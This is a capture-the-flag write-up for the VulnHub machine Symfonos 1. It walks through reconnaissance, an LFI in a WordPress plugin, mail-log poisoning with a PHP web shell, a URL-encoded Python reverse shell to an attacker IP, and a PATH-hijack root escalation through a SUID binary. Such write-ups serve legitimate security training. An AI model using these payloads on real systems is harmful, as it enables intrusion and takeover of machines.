# BOX NAME: Symfonos 1
**LINK**: https://www.vulnhub.com/entry/symfonos-1,322/

<details open><summary><ins>SUMMARY</ins></summary>

```
1. Enumerate web & smb until you find wordpress.
2. Wordpress plugins are vulnerable. Fuzz for Local File Inclusion. Think outside the box. This was hard to figure out the mail-log.
3. get a reverse shell and manipulate write-access to home-directory and add ssh-keys.
4. Enumerate files until you find statuscheck.
5. Manipulate PATH variable to give you root access.

This box was quite hard for me. Took me a great while to think outside the box and find a way into the box. The username specific mail-log had me stumped. Once that was found it was pretty much smoot sailing.
Had some issues with the SUID-file at first. Redid the steps exactly as before and then it worked. Weird..
anywho, great box!
```
</details>

# REMOTE ENUMERATION:

<details><summary><ins>TARGET</ins></summary>

```
[+] IP:		10.77.0.56
[+] URL:	http://symfonos.local
```
</details>
<details><summary><ins>NMAP</ins></summary>

```
└─$ nmap -sV -sC $IP -oN nmap-symfonos1.log     
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-28 10:10 CEST
Nmap scan report for symfonos.local (10.77.0.56)
Host is up (0.00056s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 ab5b45a70547a50445ca6f18bd1803c2 (RSA)
|   256 a05f400a0a1f68353ef45407619fc64a (ECDSA)
|_  256 bc31f540bc08584bfb6617ff8412ac1d (ED25519)
25/tcp  open  smtp        Postfix smtpd
|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
|_ssl-date: TLS randomness does not represent time
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
Service Info: Hosts:  symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: -1s
|_nbstat: NetBIOS name: SYMFONOS, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-04-28T08:11:02
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos
|   NetBIOS computer name: SYMFONOS\x00
|   Domain name: \x00
|   FQDN: symfonos
|_  System time: 2023-04-28T03:11:02-05:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.83 seconds
```
</details>
<details><summary><ins>WEB</ins></summary>

whatweb-scan

```
└─$ whatweb $URL --log-verbose=whatweb-symfonos1.log 
http://symfonos.local [200 OK] Apache[2.4.25], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[10.77.0.56]

```

nikto-scan

```
└─$ nikto -h $IP | tee nikto-symfonos1.log
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.77.0.56
+ Target Hostname:    10.77.0.56
+ Target Port:        80
+ Start Time:         2023-04-28 10:11:12 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.25 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.25 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Server may leak inodes via ETags, header found with file /, inode: 148, size: 58c6b9bb3bc5b, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .
+ /manual/: Web server manual found.
+ /manual/images/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ 8102 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2023-04-28 10:11:39 (GMT2) (27 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

fuzzing

```
index.html
/manual
/h3l105 | after smb-enumeration.

not much..
```
CrackMapExec

```
└─$ cme smb $IP                                             
SMB         10.77.0.56      445    SYMFONOS         [*] Windows 6.1 (name:SYMFONOS) (domain:) (signing:False) (SMBv1:True)

```
WPscan

```
wpscan --url $URL -e u,ap --> admin
wpscan --url $URL -U admin -P /base/wordlist/passwords/rockyou.txt

[+] mail-masta
 | Location: http://symfonos.local/h3l105/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://symfonos.local/h3l105/wp-content/plugins/mail-masta/readme.txt

[+] site-editor
 | Location: http://symfonos.local/h3l105/wp-content/plugins/site-editor/
 | Latest Version: 1.1.1 (up to date)
 | Last Updated: 2017-05-02T23:34:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.1.1 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://symfonos.local/h3l105/wp-content/plugins/site-editor/readme.txt


 └─$ searchsploit wordpress plugin site editor
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin Site Editor 1.1.1 - Local File Inclusion                         | php/webapps/44340.txt
WordPress Plugin User Role Editor 3.12 - Cross-Site Request Forgery               | php/webapps/25721.txt

POC:
view-source:http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
```
```
└─$ ffuf -u http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=FUZZ -w /base/wordlists/lfi/LFI-Linux-Filesystem.txt -fs 72 -mc 200 | tee ffuf-lfi.log

Since SMTP port 25 was running I was expecting to find some mail logs or something. So I manually tried
--> /var/mail/helios
/var/mail/admin
/var/mail/zeus
```
</details>
<details><summary><ins>OTHER</ins></summary>

SMB (Port 139,445)
```
└─$ smbclient -L //symfonos.local
Password for [WORKGROUP\jockemedlinux]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        helios          Disk      Helios personal share
        anonymous       Disk      
        IPC$            IPC       IPC Service (Samba 4.5.16-Debian)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            
                                        
```
```
└─$ smbclient -N //$IP/anonymous 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Jun 29 03:14:49 2019
  ..                                  D        0  Sat Jun 29 03:12:15 2019
  attention.txt                       N      154  Sat Jun 29 03:14:49 2019

                19994224 blocks of size 1024. 17220748 blocks available
smb: \> get attention.txt
getting file \attention.txt of size 154 as attention.txt (16.7 KiloBytes/sec) (average 16.7 KiloBytes/sec)
smb: \> 

---

└─$ cat attention.txt    
Can users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'! 
Next person I find using one of these passwords will be fired!

-Zeus
``` 
```
└─$ smbclient //$IP/helios -U helios%qwerty  
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Jun 29 02:32:05 2019
  ..                                  D        0  Sat Jun 29 02:37:04 2019
  research.txt                        A      432  Sat Jun 29 02:32:05 2019
  todo.txt                            A       52  Sat Jun 29 02:32:05 2019

                19994224 blocks of size 1024. 17148080 blocks available
smb: \> get research.txt 
getting file \research.txt of size 432 as research.txt (35.2 KiloBytes/sec) (average 35.2 KiloBytes/sec)
smb: \> get todo.txt 
getting file \todo.txt of size 52 as todo.txt (3.4 KiloBytes/sec) (average 17.5 KiloBytes/sec)
smb: \> 

```

SMTP
```
Lets try to poison the logs on /var/mail/helios
<?php system($_GET["cmd"]); ?>

└─$ telnet symfonos.local 25
Trying 10.77.0.56...
Connected to symfonos.local.
Escape character is '^]'.
220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
HELO symfonos.local
250 symfonos.localdomain
MAIL FROM: service
250 2.1.0 Ok
RCPT TO: server
550 5.1.1 <server>: Recipient address rejected: User unknown in local recipient table
RCPT TO: helios
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
<?php system($_GET["cmd"]); ?>    
.
250 2.0.0 Ok: queued as 42C2140698
quit
221 2.0.0 Bye
Connection closed by foreign host.

---

From service@symfonos.localdomain  Fri Apr 28 04:00:18 2023
Return-Path: <service@symfonos.localdomain>
X-Original-To: helios
Delivered-To: helios@symfonos.localdomain
Received: from symfonos.local (unknown [10.77.0.35])
	by symfonos.localdomain (Postfix) with SMTP id 42C2140698
	for <helios>; Fri, 28 Apr 2023 03:59:41 -0500 (CDT)

total 176
drwxr-xr-x 2 helios helios  4096 Jun 28  2019 .
drwxr-xr-x 6 helios helios  4096 Jun 28  2019 ..
-rw-r--r-- 1 helios helios  9400 Jun 28  2019 ajax_shortcode_pattern.php
-rw-r--r-- 1 helios helios 26382 Jun 28  2019 pagebuilder-options-manager.class.php
-rw-r--r-- 1 helios helios 68418 Jun 28  2019 pagebuilder.class.php
-rw-r--r-- 1 helios helios  5561 Jun 28  2019 pagebuildermodules.class.php
-rw-r--r-- 1 helios helios 34306 Jun 28  2019 pb-shortcodes.class.php
-rw-r--r-- 1 helios helios 16293 Jun 28  2019 pb-skin-loader.class.php

{"success":true,"data":{"output":[]}}

And we have code execution on the on the box. Revshell anyone?
view-source:http://symfonos.local/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/mail/helios&cmd=%2Fusr%2Fbin%2Fpython3%20-c%20%27import%20os%2Cpty%2Csocket%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28%2210.77.0.35%22%2C443%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bpty.spawn%28%22%2Fbin%2Fbash%22%29%27
```
```
While on the box we have write permissions to helios home directory. Let's put some ssh keys in there.

└─$ ssh -i id_rsa helios@$IP
Linux symfonos 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: Fri Jun 28 19:58:43 2019 from 192.168.201.133
helios@symfonos:~$ 

```


</details>


# LOCAL ENUMERATION:

<details><summary><ins>FILES OF INTEREST</ins></summary>

**FILES**:
```
/opt/statuscheck
 12K -rwsr-xr-x  1 root root 8.5K Jun 28  2019 statuscheck
strings on statuscheck shows the command is running curl.

strings statuscheck
--snip--
curl -I H
http://lH
ocalhostH
--snip--

Path Manipulation?
```

**SUID's**:

```
helios@symfonos:/opt$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/opt/statuscheck
/bin/mount
/bin/umount
/bin/su
/bin/ping
```
**SGID's**:

```
/sbin/unix_chkpwd
/usr/sbin/postdrop
/usr/sbin/postqueue
/usr/bin/expiry
/usr/bin/chage
/usr/bin/bsd-write
/usr/bin/wall
/usr/bin/ssh-agent
/usr/bin/dotlockfile
/usr/bin/crontab
/usr/bin/dotlock.mailutils
```
**OTHERS**:

```

```
</details>

<details><summary><ins>USEFUL INFORMATION:</ins></summary>

**Kernel Info:**
*file /bin/bash ; echo -e " \\n" && lsb_release -a ; echo -e "\\n" && uname -a*

```

```
</details>

<details><summary><ins>CREDS:</ins></summary>

```
username:password
zeus:
helios:	
	:epidioko
	:qwerty 
	:baseball

```
</details>

<details><summary><ins>HASHES:</ins></summary>

```

```
</details>

# Proofs

<details><summary><ins>Proofs</ins></summary>

Final payload:
```
echo '
#!/bin/bash
cp /bin/bash /tmp/rootbash; chown root:root /tmp/rootbash; chmod +xs /tmp/rootbash' > /tmp/curl
/opt/statuscheck
/tmp/rootbash -p
```
```
helios@symfonos:/tmp$ ./rootbash -p
rootbash-4.4# id
uid=1000(helios) gid=1000(helios) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),1000(helios)
rootbash-4.4# cat /root/
.bash_history     .bashrc           .profile          proof.txt         .selected_editor  
rootbash-4.4# cat /root/proof.txt 

        Congrats on rooting symfonos:1!

                 \ __
--==/////////////[})))==*
                 / \ '          ,|
                    `\`\      //|                             ,|
                      \ `\  //,/'                           -~ |
   )             _-~~~\  |/ / |'|                       _-~  / ,
  ((            /' )   | \ / /'/                    _-~   _/_-~|
 (((            ;  /`  ' )/ /''                 _ -~     _-~ ,/'
 ) ))           `~~\   `\\/'/|'           __--~~__--\ _-~  _/, 
((( ))            / ~~    \ /~      __--~~  --~~  __/~  _-~ /
 ((\~\           |    )   | '      /        __--~~  \-~~ _-~
    `\(\    __--(   _/    |'\     /     --~~   __--~' _-~ ~|
     (  ((~~   __-~        \~\   /     ___---~~  ~~\~~__--~ 
      ~~\~~~~~~   `\-~      \~\ /           __--~~~'~~/
                   ;\ __.-~  ~-/      ~~~~~__\__---~~ _..--._
                   ;;;;;;;;'  /      ---~~~/_.-----.-~  _.._ ~\     
                  ;;;;;;;'   /      ----~~/         `\,~    `\ \        
                  ;;;;'     (      ---~~/         `:::|       `\\.      
                  |'  _      `----~~~~'      /      `:|        ()))),      
            ______/\/~    |                 /        /         (((((())  
          /~;;.____/;;'  /          ___.---(   `;;;/             )))'`))
         / //  _;______;'------~~~~~    |;;/\    /                ((   ( 
        //  \ \                        /  |  \;;,\                 `   
       (<_    \ \                    /',/-----'  _> 
        \_|     \\_                 //~;~~~~~~~~~ 
                 \_|               (,~~   
                                    \~\
                                     ~~

        Contact me via Twitter @zayotic to give feedback!


rootbash-4.4# 

``` 
</details>